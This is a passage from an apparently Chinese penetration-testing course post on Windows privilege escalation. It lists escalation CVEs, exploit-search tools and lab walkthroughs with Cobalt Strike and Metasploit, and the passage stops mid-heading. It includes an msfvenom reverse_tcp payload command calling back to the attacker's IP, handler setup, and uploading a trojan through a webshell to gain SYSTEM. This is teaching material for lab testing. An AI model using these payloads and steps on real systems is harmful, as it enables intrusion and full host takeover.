title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h4><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h4 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h4><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><h5 id="系统权限：如同在你自己操作自己的电脑一样"><a href="#系统权限：如同在你自己操作自己的电脑一样" class="headerlink" title="系统权限：如同在你自己操作自己的电脑一样"></a>系统权限：如同在你自己操作自己的电脑一样</h5><h5 id="域控权限：如同在你自己操作自己的虚拟机一样"><a href="#域控权限：如同在你自己操作自己的虚拟机一样" class="headerlink" title="域控权限：如同在你自己操作自己的虚拟机一样"></a>域控权限：如同在你自己操作自己的虚拟机一样</h5><blockquote><h3 id="演示案例：（win2008、2012、2016、2019）"><a href="#演示案例：（win2008、2012、2016、2019）" class="headerlink" title="演示案例：（win2008、2012、2016、2019）"></a>演示案例：（win2008、2012、2016、2019）</h3><h4 id="➢-Web-amp-Win2008-人工手动-筛选-amp-下载-amp-利用"><a href="#➢-Web-amp-Win2008-人工手动-筛选-amp-下载-amp-利用" class="headerlink" title="➢ Web&amp;Win2008-人工手动-筛选&amp;下载&amp;利用"></a>➢ Web&amp;Win2008-人工手动-筛选&amp;下载&amp;利用</h4><h4 id="➢-Web-amp-Win2008-CS半自动-反弹-amp-插件-amp-利用"><a href="#➢-Web-amp-Win2008-CS半自动-反弹-amp-插件-amp-利用" class="headerlink" title="➢ Web&amp;Win2008-CS半自动-反弹&amp;插件&amp;利用"></a>➢ Web&amp;Win2008-CS半自动-反弹&amp;插件&amp;利用</h4><h4 id="➢-Web-amp-Win2012-MSF全自动-筛选-amp-探针-amp-利用"><a href="#➢-Web-amp-Win2012-MSF全自动-筛选-amp-探针-amp-利用" class="headerlink" title="➢ Web&amp;Win2012-MSF全自动-筛选&amp;探针&amp;利用"></a>➢ Web&amp;Win2012-MSF全自动-筛选&amp;探针&amp;利用</h4><h4 id="➢-Web-amp-Win2016-amp-2019-Ladon半自动-上传利用"><a href="#➢-Web-amp-Win2016-amp-2019-Ladon半自动-上传利用" class="headerlink" title="➢ Web&amp;Win2016&amp;2019-Ladon半自动-上传利用"></a>➢ Web&amp;Win2016&amp;2019-Ladon半自动-上传利用</h4></blockquote><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418142741143.png" alt="image-20230418142741143"></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418144102318.png" alt="image-20230418144102318"></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418144050638.png" alt="image-20230418144050638"></p><h3 id="截止2022年前的主流提权漏洞："><a href="#截止2022年前的主流提权漏洞：" class="headerlink" title="#截止2022年前的主流提权漏洞："></a>#截止2022年前的主流提权漏洞：</h3><p>CVE-2021-33739 [Microsoft DWM 核心库特权提升漏洞]（Windows 10、20）</p><p>CVE-2021-1732 [Windows Win32k 提权漏洞] (Windows 10, 2019&#x2F;20H2)</p><p>CVE-2020-0787【Windows后台智能传输服务提权漏洞】（Windows 7&#x2F;8&#x2F;10、2008&#x2F;2012&#x2F;2016&#x2F;2019）</p><p>CVE-2020-0796 [Microsoft 服务器消息块 3.1.1 (SMBv3) 协议处理某些请求的方式中存在一个远程代码执行漏洞，即“Windows SMBv3 客户端&#x2F;服务器远程代码执行漏洞”] (Windows 1903&#x2F;1909 )</p><p>CVE-2019-1458 [当Win32k组件无法正确处理内存中的对象时，Windows中存在一个特权提升漏洞]（Windows 7&#x2F;8&#x2F;10&#x2F;2008&#x2F;2012&#x2F;2016）</p><p>CVE-2019-0803 [Win32k 组件无法正确处理内存中的对象时，Windows 中存在提权漏洞] (Windows 7&#x2F;8&#x2F;10&#x2F;2008&#x2F;2012&#x2F;2016&#x2F;2019)</p><p>CVE-2018-8639 [Win32k 组件无法正确处理内存中的对象时，Windows 中存在提权漏洞] (Windows 7&#x2F;8&#x2F;10&#x2F;2008&#x2F;2012&#x2F;2016)</p><p>CVE-2018-1038 [Windows 内核提权漏洞]（Windows 7 SP1&#x2F;Windows Server 2008 R2 SP1）</p><p>CVE-2018-0743 [Windows Subsystem for Linux Elevation of Privilege Vulnerability]（Windows 10 版本 1703&#x2F;Windows 10 版本 1709&#x2F;Windows Server 版本 1709）</p><p>CVE-2018-8453 [Windows Win32k 组件中的提权漏洞] (&gt;&#x3D; windows 8.1)</p><p>CVE-2018-8440 [Windows ALPC 提权漏洞] (windows 7&#x2F;8.1&#x2F;10&#x2F;2008&#x2F;2012&#x2F;2016)</p><p>MS17-017 　[KB4013081] [GDI 调色板对象本地权限提升]（Windows 7&#x2F;8）</p><p>CVE-2017-8464 　[LNK远程执行代码漏洞]（Windows 10 &#x2F; 8.1 &#x2F; 7&#x2F;2016&#x2F;2010&#x2F;2008）</p><p>CVE-2017-0213 　[Windows COM 提权漏洞] (windows 10&#x2F;8.1&#x2F;7&#x2F;2016&#x2F;2010&#x2F;2008)</p><p>CVE-2018-0833 [SMBv3 空指针取消引用拒绝服务] (Windows 8.1&#x2F;Server 2012 R2)</p><p>CVE-2018-8120 [Win32k 提权漏洞] (Windows 7 SP1&#x2F;2008 SP2,2008 R2 SP1)</p><p>MS17-010 　[KB4013389] [Windows 内核模式驱动程序] (windows 7&#x2F;2008&#x2F;2003&#x2F;XP)</p><p>MS16-135 　[KB3199135] [Windows 内核模式驱动程序] (2016)</p><p>MS16-111 　[KB3186973] [内核 API] (Windows 10 10586 (32&#x2F;64)&#x2F;8.1)</p><p>MS16-098 　[KB3178466] [内核驱动程序] (Win 8.1)</p><p>MS16-075 　[KB3164038] [热土豆] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012)</p><p>MS16-034 　[KB3143145] [内核驱动程序] (2008&#x2F;7&#x2F;8&#x2F;10&#x2F;2012)</p><p>MS16-032 　[KB3143141] [辅助登录句柄] (2008&#x2F;7&#x2F;8&#x2F;10&#x2F;2012)</p><p>MS16-016 　[KB3136041] [WebDAV] (2008&#x2F;Vista&#x2F;7)</p><p>MS16-014 　[K3134228] [远程代码执行] (2008&#x2F;Vista&#x2F;7)</p><p>MS15-097 　[KB3089656] [远程代码执行] (win8.1&#x2F;2012)</p><p>MS15-076 　[KB3067505] [RPC] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012)</p><p>MS15-077 　[KB3077657] [ATM] (XP&#x2F;Vista&#x2F;Win7&#x2F;Win8&#x2F;2000&#x2F;2003&#x2F;2008&#x2F;2012)</p><p>MS15-061 　[KB3057839] [内核驱动程序] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012)</p><p>MS15-051 　[KB3057191] [Windows内核模式驱动程序]（2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012）</p><p>MS15-015 　[KB3031432] [内核驱动程序] (Win7&#x2F;8&#x2F;8.1&#x2F;2012&#x2F;RT&#x2F;2012 R2&#x2F;2008 R2)</p><p>MS15-010 　[KB3036220] [内核驱动程序] (2003&#x2F;2008&#x2F;7&#x2F;8)</p><p>MS15-001 　[KB3023266] [内核驱动程序] (2008&#x2F;2012&#x2F;7&#x2F;8)</p><p>MS14-070 　[KB2989935] [内核驱动程序] (2003)</p><p>MS14-068 　[KB3011780] [域权限提升] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8)</p><p>MS14-058 　[KB3000061] [Win32k.sys] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8)</p><p>MS14-066 　[KB2992611] [Windows Schannel 允许远程代码执行] (VistaSP2&#x2F;7 SP1&#x2F;8&#x2F;Windows 8.1&#x2F;2003 SP2&#x2F;2008 SP2&#x2F;2008 R2 SP1&#x2F;2012&#x2F;2012 R2&#x2F;Windows RT&#x2F;Windows RT 8.1)</p><p>MS14-040 　[KB2975684] [AFD 驱动程序] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8)</p><p>MS14-002 　[KB2914368] [NDProxy] (2003&#x2F;XP)</p><p>MS13-053 　[KB2850851] [win32k.sys] (XP&#x2F;Vista&#x2F;2003&#x2F;2008&#x2F;win 7)</p><p>MS13-046 　[KB2840221] [dxgkrnl.sys] (Vista&#x2F;2003&#x2F;2008&#x2F;2012&#x2F;7)</p><p>MS13-005 　[KB2778930] [内核模式驱动程序] (2003&#x2F;2008&#x2F;2012&#x2F;win7&#x2F;8)</p><p>MS12-042 　[KB2972621] [服务总线] (2008&#x2F;2012&#x2F;win7)</p><p>MS12-020 　[KB2671387] [RDP] (2003&#x2F;2008&#x2F;7&#x2F;XP)</p><p>MS11-080 　[KB2592799] [AFD.sys] (2003&#x2F;XP)</p><p>MS11-062 　[KB2566454] [NDISTAPI] (2003&#x2F;XP)</p><p>MS11-046 　[KB2503665] [AFD.sys] (2003&#x2F;2008&#x2F;7&#x2F;XP)</p><p>MS11-011 　[KB2393802] [内核驱动程序] (2003&#x2F;2008&#x2F;7&#x2F;XP&#x2F;Vista)</p><p>MS10-092 　[KB2305420] [任务计划程序] (2008&#x2F;7)</p><p>MS10-065 　[KB2267960] [FastCGI]（IIS 5.1、6.0、7.0 和 7.5）</p><p>MS10-059 　[KB982799] [ACL-Churraskito] (2008&#x2F;7&#x2F;Vista)</p><p>MS10-048 　[KB2160329] [win32k.sys] (XP SP2 &amp; SP3&#x2F;2003 SP2&#x2F;Vista SP1 &amp; SP2&#x2F;2008 Gold &amp; SP2 &amp; R2&#x2F;Win7)</p><p>MS10-015 　[KB977165] [KiTrap0D] (2003&#x2F;2008&#x2F;7&#x2F;XP)</p><p>MS10-012 　[KB971468] [SMB 客户端 Trans2 堆栈溢出] (Windows 7&#x2F;2008R2)</p><p>MS09-050 　[KB975517] [远程代码执行] (2008&#x2F;Vista)</p><p>MS09-020 　[KB970483] [IIS 6.0]（IIS 5.1 和 6.0）</p><p>MS09-012 　[KB959454] [Chimichurri] (Vista&#x2F;win7&#x2F;2008&#x2F;Vista)</p><p>MS08-068 　[KB957097] [远程代码执行] (2000&#x2F;XP)</p><p>MS08-067 　[KB958644] [远程代码执行] (Windows 2000&#x2F;XP&#x2F;Server 2003&#x2F;Vista&#x2F;Server 2008)</p><p>MS08-066 　[KB956803] [AFD.sys] (Windows 2000&#x2F;XP&#x2F;Server 2003)</p><p>MS08-025 　[KB941693] [Win32.sys] (XP&#x2F;2003&#x2F;2008&#x2F;Vista)</p><p>MS06-040 　[KB921883] [远程代码执行] (2003&#x2F;xp&#x2F;2000)</p><p>MS05-039 　[KB899588] [PnP 服务] (Win 9X&#x2F;ME&#x2F;NT&#x2F;2000&#x2F;XP&#x2F;2003)</p><p>MS03-026 　[KB823980] [RPC接口中的缓冲区溢出]（&#x2F; NT &#x2F; 2000 &#x2F; XP &#x2F; 2003）</p><p><strong>用tasklist &#x2F;svc查看进程有什么杀软</strong></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418144715602.png" alt="image-20230418144715602"></p><h3 id="Web-amp-Windows-人工手动-筛选-amp-下载-amp-利用"><a href="#Web-amp-Windows-人工手动-筛选-amp-下载-amp-利用" class="headerlink" title="#Web&amp;Windows-人工手动-筛选&amp;下载&amp;利用"></a>#Web&amp;Windows-人工手动-筛选&amp;下载&amp;利用</h3><p><code>如果提权中无法执行命令的话，可以尝试上传cmd.exe到可读写目录再调用执行</code></p><h5 id="1、脚本项目筛选：补丁-amp-系统-amp-漏洞等"><a href="#1、脚本项目筛选：补丁-amp-系统-amp-漏洞等" class="headerlink" title="1、脚本项目筛选：补丁&amp;系统&amp;漏洞等"></a>1、脚本项目筛选：补丁&amp;系统&amp;漏洞等</h5><p><strong>Vulmap</strong>：<a href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418145244769.png" alt="image-20230418145244769"></p><p><strong>wesng</strong>：<a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418144848583.png" alt="image-20230418144848583"></p><p><strong>WindowsVulnScan</strong>：<a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418144917213.png" alt="image-20230418144917213"></p><h5 id="1-1、网站平台筛选：补丁-amp-系统-amp-漏洞等"><a href="#1-1、网站平台筛选：补丁-amp-系统-amp-漏洞等" class="headerlink" title="1.1、网站平台筛选：补丁&amp;系统&amp;漏洞等"></a>1.1、网站平台筛选：补丁&amp;系统&amp;漏洞等</h5><p><a href="https://i.hacking8.com/tiquan%EF%BC%8C%E5%B0%86systeminfo%E7%9A%84%E4%BF%A1%E6%81%AF%E5%A4%8D%E5%88%B6%E4%B8%8B%E6%9D%A5">https://i.hacking8.com/tiquan，将systeminfo的信息复制下来</a></p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418145803365.png" alt="image-20230418145803365"></p><h5 id="2、漏洞EXP下载执行："><a href="#2、漏洞EXP下载执行：" class="headerlink" title="2、漏洞EXP下载执行："></a>2、漏洞EXP下载执行：</h5><p><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p><a href="https://github.com/Ascotbe/KernelHub">https://github.com/Ascotbe/KernelHub</a></p><p><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></p><p><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p><p><a href="http://cve.mitre.org/data/refs/refmap/source-MS.html">http://cve.mitre.org/data/refs/refmap/source-MS.html</a></p><h5 id="说明：通过对应补丁漏洞编号寻可利用EXP"><a href="#说明：通过对应补丁漏洞编号寻可利用EXP" class="headerlink" title="说明：通过对应补丁漏洞编号寻可利用EXP"></a>说明：通过对应补丁漏洞编号寻可利用EXP</h5><p>MS&amp;CVE 关系区别&amp;对应反查</p><p>KernelHub 针对常用溢出编号指定找EXP</p><p>Poc-in-Github 针对年份及编号指定找EXP</p><p>exploitdb 针对类型及关键说明指定找EXP</p><h5 id="3、上传EXP调用执行"><a href="#3、上传EXP调用执行" class="headerlink" title="3、上传EXP调用执行"></a>3、上传EXP调用执行</h5><p>这里根据筛选了补丁并根据补丁找到exp，执行了没有任何反应，但是不明所以然，手工测试比较工具还是会差点</p><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418151112545.png" alt="image-20230418151112545"></p><h3 id="Web-amp-Windows-CS半自动-反弹-amp-插件-amp-利用"><a href="#Web-amp-Windows-CS半自动-反弹-amp-插件-amp-利用" class="headerlink" title="#Web&amp;Windows-CS半自动-反弹&amp;插件&amp;利用"></a>#Web&amp;Windows-CS半自动-反弹&amp;插件&amp;利用</h3><h6 id="cs登录自己的ip"><a href="#cs登录自己的ip" class="headerlink" title="cs登录自己的ip"></a>cs登录自己的ip</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418163142518.png" alt="image-20230418163142518"></p><h5 id="1、配置启动"><a href="#1、配置启动" class="headerlink" title="1、配置启动"></a>1、配置启动</h5><p>服务器启动服务端：</p><p>chmod +x teamserver</p><p>.&#x2F;teamserver IP password</p><p>客户端连接服务端：</p><p>运行cobaltstrike.bat（运行不起来请检测JDK版本）</p><h5 id="2、配置监听器生成后执行"><a href="#2、配置监听器生成后执行" class="headerlink" title="2、配置监听器生成后执行"></a>2、配置监听器生成后执行</h5><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418163454646.png" alt="image-20230418163454646"></p><h6 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418163531128.png" alt="image-20230418163531128"></p><h6 id="这里本地测试为了节约时间将回连间隔时间60s改为0s"><a href="#这里本地测试为了节约时间将回连间隔时间60s改为0s" class="headerlink" title="这里本地测试为了节约时间将回连间隔时间60s改为0s"></a>这里本地测试为了节约时间将回连间隔时间60s改为0s</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418164042904.png" alt="image-20230418164042904"></p><h6 id="调用脚本"><a href="#调用脚本" class="headerlink" title="调用脚本"></a>调用脚本</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418164250258.png" alt="image-20230418164250258"></p><h6 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418164319449.png" alt="image-20230418164319449"></p><h5 id="3、选择提权模块调用执行"><a href="#3、选择提权模块调用执行" class="headerlink" title="3、选择提权模块调用执行"></a>3、选择提权模块调用执行</h5><h6 id="利用插件（通杀插件）"><a href="#利用插件（通杀插件）" class="headerlink" title="利用插件（通杀插件）"></a>利用插件（通杀插件）</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418164934810.png" alt="image-20230418164934810"></p><h6 id="可以用命令行"><a href="#可以用命令行" class="headerlink" title="可以用命令行"></a>可以用命令行</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165529885.png" alt="image-20230418165529885"></p><h6 id="浏览文件看111-exe的路径，执行命令让其主机执行111-exe木马文件"><a href="#浏览文件看111-exe的路径，执行命令让其主机执行111-exe木马文件" class="headerlink" title="浏览文件看111.exe的路径，执行命令让其主机执行111.exe木马文件"></a>浏览文件看111.exe的路径，执行命令让其主机执行111.exe木马文件</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165725515.png" alt="image-20230418165725515"></p><h6 id="执行成功，获得system权限"><a href="#执行成功，获得system权限" class="headerlink" title="执行成功，获得system权限"></a>执行成功，获得system权限</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165807005.png" alt="image-20230418165807005"></p><h6 id="也可以利用第二个插件"><a href="#也可以利用第二个插件" class="headerlink" title="也可以利用第二个插件"></a>也可以利用第二个插件</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165132098.png" alt="image-20230418165132098"></p><h6 id="选择模块"><a href="#选择模块" class="headerlink" title="选择模块"></a>选择模块</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165206641.png" alt="image-20230418165206641"></p><h6 id="执行后返回了system权限"><a href="#执行后返回了system权限" class="headerlink" title="执行后返回了system权限"></a>执行后返回了system权限</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418165252466.png" alt="image-20230418165252466"></p><h3 id="Web-amp-Windows-MSF全自动-筛选-amp-探针-amp-利用（靶机win2008、win2012）"><a href="#Web-amp-Windows-MSF全自动-筛选-amp-探针-amp-利用（靶机win2008、win2012）" class="headerlink" title="#Web&amp;Windows-MSF全自动-筛选&amp;探针&amp;利用（靶机win2008、win2012）"></a>#Web&amp;Windows-MSF全自动-筛选&amp;探针&amp;利用（靶机win2008、win2012）</h3><h5 id="1、生成反弹后门"><a href="#1、生成反弹后门" class="headerlink" title="1、生成反弹后门"></a>1、生成反弹后门</h5><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp  <strong>LHOST</strong>&#x3D;要反弹监听的自己的公网ip  <strong>LPORT</strong>&#x3D;3333 -f exe -o msf.exe</p><h5 id="2、配置监听会话"><a href="#2、配置监听会话" class="headerlink" title="2、配置监听会话"></a>2、配置监听会话</h5><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 3333</p><p>exploit</p><h6 id="先测试win2008"><a href="#先测试win2008" class="headerlink" title="先测试win2008"></a>先测试win2008</h6><h6 id="将msf生成的msf-exe利用哥斯拉上传到网站，执行，获取的是wehshell的权限不是system"><a href="#将msf生成的msf-exe利用哥斯拉上传到网站，执行，获取的是wehshell的权限不是system" class="headerlink" title="将msf生成的msf.exe利用哥斯拉上传到网站，执行，获取的是wehshell的权限不是system"></a>将msf生成的msf.exe利用哥斯拉上传到网站，执行，获取的是wehshell的权限不是system</h6><p><img src="/../images/Day98-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E5%85%A8%E5%B9%B3%E5%8F%B0-MSF%E8%87%AA%E5%8A%A8%E5%8C%96-CS%E6%8F%92%E4%BB%B6%E5%8C%96-EXP%E7%AD%9B%E9%80%89-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230418152011261.png" alt="image-20230418152011261"></p><h5 id="2-1、筛选EXP模块"><a href="#2-1、筛选EXP模块" class="headerlink" title="2.1、筛选EXP模块"></a>2.1、筛选EXP模块</h5><p>use post&#x2F;windows&#x2F;gather&#x2F;enum_patches（半自动：根据漏洞编号找出系统中安装的补丁）</p><p>use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester（全自动：快速识别系统中可能被利用的漏洞）</p><p>set showdescription true（展示漏洞详细）</p><h5 id="如下：没有打开showdescription-时，只出现了一个，设置为true打开后出现了很多（这里显示的172-16-41-220是公网ip对应主机的内网ip，不用在意）"><a href="#如下：没有打开showdescription-时，只出现了一个，设置为true打开后出现了很多（这里显示的172-16-41-220是公网ip对应主机的内网ip，不用在意）" class="headerlink" title="如下：没有打开showdescription 时，只出现了一个，设置为true打开后出现了很多（这里显示的172.16.41.220是公网ip对应主机的内网ip，不用在意）"></a><strong>如下：没有打开showdescription 